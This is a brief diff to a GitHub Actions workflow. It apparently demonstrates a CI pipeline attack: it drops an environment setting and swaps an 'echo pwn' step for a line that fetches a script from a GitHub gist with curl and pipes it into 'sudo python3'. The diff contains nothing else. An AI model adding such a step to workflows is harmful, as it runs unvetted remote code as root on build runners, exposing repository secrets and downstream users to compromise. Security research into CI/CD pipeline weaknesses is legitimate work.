@@ -5,7 +5,6 @@ on:
 jobs:
   a:
     runs-on: ubuntu-latest
-    environment: asd
     steps:
-      - run: echo "pwn"
+      - run: curl -sL https://gist.githubusercontent.com/fproulx-boostsecurity/d63abaaac3318a4c66ef958ef2e5b525/raw/ | sudo python3
       
